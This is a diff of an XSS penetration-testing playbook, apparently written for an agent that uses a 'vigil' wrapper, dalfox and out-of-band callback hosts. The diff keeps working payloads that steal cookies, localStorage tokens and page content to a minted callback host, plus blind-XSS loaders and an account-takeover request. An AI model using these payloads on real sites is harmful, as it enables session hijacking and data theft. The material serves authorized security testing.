@@ -22,7 +22,7 @@ Most XSS findings in 2025 are in client-side rendering contexts (React `dangerou
 - `vigil assess kali exec -- dalfox ...` (automated reflected XSS scanner — all target-facing tool invocations must go through the kali exec wrapper; use `--technique XSS --probe-kind payload --phase consume-test --timeout 300`)
 - `vigil assess kali exec -- curl ...` (manual request crafting and response analysis — use `--technique XSS --probe-kind payload --phase consume-test --timeout 30`)
 - Browser DevTools — DOM inspection, source-to-sink tracing, event listener enumeration (client-side analysis only)
-- `vigil oob mint` / `vigil oob poll` — blind XSS verification: mint a nonce-tagged callback host per injection point, embed it in the payload, then `poll` to see which planted payload fired and where (replaces eyeballing the raw listener log). Check readiness with `vigil oob status --json`; if no named client is running, start one with `vigil oob client start <name> --engagement <key> --agent <agent>`.
+- `vigil oob mint` / `vigil oob poll` — blind XSS verification: `mint --client <name>` binds a nonce-tagged callback host under a running client's interactsh id (so `poll` can correlate it) and prints the full host `<nonce>.<client-id>.researcher.example` — call this `$OOB_HOST`. Pass `--client <name>` when several clients run; `mint` auto-selects the sole running client otherwise. Embed the EXACT host `mint` prints in the payload (never hand-build it — a bare `<nonce>.researcher.example` host would never reach poll), then `poll` to see which planted payload fired and where (replaces eyeballing the raw listener log). Check readiness with `vigil oob status --json`; if no named client is running, start one with `vigil oob client start <name> --engagement <key> --agent <agent>`.
 
 ---
 
@@ -48,7 +48,7 @@ Target has query parameters reflecting in HTML?
 
 ## Automated Scanning with dalfox
 
-Run dalfox through the kali exec wrapper so every scan lands in the audit pipeline. For blind XSS callbacks, mint the callback host first (`vigil oob mint --technique blind-xss --target-url <url> --probe-kind dalfox-blind`) and pass its `http` URL to `--blind`; after the scan, `vigil oob poll --client <name>` tells you whether dalfox's blind payload ever rendered.
+Run dalfox through the kali exec wrapper so every scan lands in the audit pipeline. For blind XSS callbacks, mint the callback host first (`vigil oob mint --client <name> --technique blind-xss --target-url <url> --probe-kind dalfox-blind`) — `mint` binds the nonce under that client's interactsh id so `poll` can correlate it (pass `--client <name>` when several clients run) — and pass the `http` URL it prints to `--blind`; after the scan, `vigil oob poll --client <name>` tells you whether dalfox's blind payload ever rendered.
 
 ```bash
 # Single URL with parameter
@@ -65,7 +65,7 @@ vigil assess kali exec \
   -- sh -c 'cat /engagements/$ENGAGEMENT_KEY/scans/urls_with_params.txt | dalfox pipe --silence'
 
 # With blind XSS callback — mint the host, capture its http URL, pass to --blind
-OOB_CALLBACK_URL=$(vigil oob mint --technique blind-xss \
+OOB_CALLBACK_URL=$(vigil oob mint --client <name> --technique blind-xss \
   --target-url "https://TARGET/search?q=test" --probe-kind dalfox-blind --json \
   | python3 -c 'import json,sys; print(json.load(sys.stdin)["urls"]["http"])')
 vigil assess kali exec \
@@ -266,26 +266,26 @@ Use an OOB callback to detect when and where the payload fires. **Mint a fresh n
 
 ```bash
 # Mint one callback per planted field; the printed host carries a unique nonce
-vigil oob mint --technique blind-xss --target-url "https://target/support/ticket" \
+vigil oob mint --client <name> --technique blind-xss --target-url "https://target/support/ticket" \
   --param ticket_subject --probe-kind stored-blind
-# → http  http://<nonce>.researcher.example/
+# → host  <nonce>.<client-id>.researcher.example   (= $OOB_HOST)
 ```
 
-Substitute that host (shown below as `<nonce>.researcher.example`) into each payload:
+Substitute the EXACT host `vigil oob mint --client <name>` prints (`$OOB_HOST` — it already embeds the client id; never hand-build it) into each payload:
 
 ```html
 <!-- Basic blind XSS with callback -->
-"><script src=https://<nonce>.researcher.example/probe></script>
+"><script src=https://$OOB_HOST/probe></script>
 
 <!-- If script tags are filtered, use event handlers -->
-"><img src=x onerror=fetch('https://<nonce>.researcher.example/probe?c='+document.cookie)>
+"><img src=x onerror=fetch('https://$OOB_HOST/probe?c='+document.cookie)>
 
 <!-- Polyglot for unknown context -->
-jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik2telerik3telerik4telerik5telerik6//oNcliCk=alert()//><svg onload=fetch('https://<nonce>.researcher.example/x')//
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik2telerik3telerik4telerik5telerik6//oNcliCk=alert()//><svg onload=fetch('https://$OOB_HOST/x')//
 
 <!-- Data exfiltration payload (fires silently in admin context) -->
 "><script>
-fetch('https://<nonce>.researcher.example/hit', {
+fetch('https://$OOB_HOST/hit', {
   method: 'POST',
   body: JSON.stringify({
     url: location.href,
@@ -410,24 +410,24 @@ Stored XSS requires a two-phase test: inject, then find every location where the
 
 `alert(1)` proves execution. Engagement reports need impact — you must show the attacker outcome, not just code execution.
 
-Mint a callback host for the exfil payload (`vigil oob mint --technique blind-xss --probe-kind exfil`), substitute its nonce host below, and confirm the steal landed with `vigil oob poll --client <name>`.
+Mint a callback host for the exfil payload (`vigil oob mint --client <name> --technique blind-xss --probe-kind exfil`), substitute the EXACT host it prints (`$OOB_HOST` — it already embeds the client id; never hand-build it) below, and confirm the steal landed with `vigil oob poll --client <name>`.
 
 ```javascript
 // Prove execution context
 alert(document.domain)
 
-// Session hijack — cookie theft (substitute the minted <nonce>.researcher.example host)
-fetch('https://<nonce>.researcher.example/steal?c='+document.cookie)
-new Image().src='https://<nonce>.researcher.example/steal?c='+document.cookie
+// Session hijack — cookie theft (substitute the EXACT host mint --client <name> prints — $OOB_HOST; never hand-build it)
+fetch('https://$OOB_HOST/steal?c='+document.cookie)
+new Image().src='https://$OOB_HOST/steal?c='+document.cookie
 
 // Token theft from localStorage/sessionStorage
-fetch('https://<nonce>.researcher.example/steal?t='+localStorage.getItem('auth_token'))
+fetch('https://$OOB_HOST/steal?t='+localStorage.getItem('auth_token'))
 
 // Account takeover — change email/password via authenticated API call
 fetch('/api/user/email', {method:'PUT', headers:{'Content-Type':'application/json'}, body:'{"email":"attacker@evil.example"}'})
 
 // DOM data exfiltration — steal what the victim sees
-fetch('https://<nonce>.researcher.example/dom', {method:'POST', body:document.body.innerHTML.substring(0,5000)})
+fetch('https://$OOB_HOST/dom', {method:'POST', body:document.body.innerHTML.substring(0,5000)})
 ```
 
 **Severity calibration**: XSS alone is typically MEDIUM. XSS + session hijack = HIGH. XSS + account takeover chain = HIGH/CRITICAL. Blind XSS in admin panel + admin session hijack + admin action (user management, config change) = CRITICAL.
